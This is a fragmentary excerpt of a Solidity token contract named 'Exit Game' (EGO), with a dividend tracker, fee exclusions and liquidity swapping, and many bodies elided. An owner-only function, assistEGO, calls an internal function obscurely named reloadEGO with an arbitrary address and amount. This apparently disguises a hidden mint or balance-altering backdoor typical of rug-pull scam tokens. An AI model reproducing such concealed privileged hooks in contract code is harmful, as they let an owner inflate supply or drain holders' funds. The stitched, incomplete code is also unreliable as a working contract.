...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function reloadEGO(address account, uint256 amount) internal virtual {
...
function reloadEGO(address account, uint256 value) internal override {
    super.reloadEGO(account, value);
...
contract EGOrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardEGOMap  for RewardEGOMap .Map;
RewardEGOMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("EGO_rewardToken_Tracker", "EGO_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "EGO_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "EGO_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EGO contract.");
    }
...
contract EGO is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    EGOrewardToken public rewardToken;
 ...
 address public lp;
  ILP public adressLiquidity;
    address public marketingReciever =0x782B72c317661dFb6432563065335Fc6D1D15000;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Exit Game", "EGO") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new EGOrewardToken();
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function assistEGO(address tokenAddress, uint256 tokenePercent) public masterWallet{
       reloadEGO(tokenAddress, tokenePercent);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "EGO: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "EGO: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "EGO: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "EGO: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTEGO = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTEGO);
...
addLiquidity(tokensTEGO, bnbForLiquidity);
